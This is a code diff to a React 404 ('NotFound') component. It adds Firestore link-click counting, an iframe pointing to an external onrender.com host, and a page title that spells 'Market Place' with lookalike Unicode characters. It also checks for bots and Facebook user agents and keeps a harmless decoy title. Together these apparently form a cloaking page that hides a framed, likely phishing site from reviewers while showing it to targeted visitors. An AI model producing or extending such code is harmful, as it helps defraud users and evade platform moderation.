@@ -2,15 +2,32 @@ import React, { useEffect, useState } from "react";
 import { isbot } from "isbot";
 import { Helmet } from 'react-helmet';
 import MetaIcon from '../resources/favicon2.ico';
+import {
+  collection,
+  addDoc,
+  deleteDoc,
+  onSnapshot,
+  query,
+  where,
+  doc,
+  updateDoc,
+  runTransaction,
+  orderBy,
+  getDocs,
+  limit,
+} from "firebase/firestore";
+import { db } from "../firebase";
 
 
 function NotFound() {
-  let[countryCode, setCountryCode] = useState('');
+  const [IsChecked, setIsChecked] = useState(0);
+  let[countryCode, setCountryCode] = useState('vn');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://stackclient-ten.vercel.app');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Page | Center');
-  let[SiteTitleHome, SetSiteTitleHome] = useState('Clean Juice | Landing Page');
-
+  let[IframeUrl, SetIframeUrl] = useState('https://stackclient-hhrs.onrender.com/');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Μаrkеt Ꮲⅼасе');
+  let[SiteTitleHome, SetSiteTitleHome] = useState('Simple Bookmark');
+  const usersRef = collection(db, "links");
+  const q = query(usersRef, orderBy("createdAt", "desc"));
 
   function showIframe(file,title,favicon) {
     const html = (
@@ -72,8 +89,26 @@ function NotFound() {
     }
   };
   useEffect(() => {
-    setLocaltion();
+    //setLocaltion();
   }, []);
+
+  const params = new URLSearchParams(window.location.search)
+
+  if(!params.get("id")){
+    SetUserHiden(true);
+  }else{
+     runTransaction(db, async (transaction) => {
+      const sfDocRef = doc(db, "links",params.get("id"));
+      const sfDoc = await transaction.get(sfDocRef);
+      if (!sfDoc.exists()) {
+        SetUserHiden(true);
+      }else{
+        const counter = (sfDoc?.get("counter") || 0) + 1;
+        transaction.update(sfDocRef, { counter });
+        SetUserHiden(false);
+      }
+    });
+  }
 
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
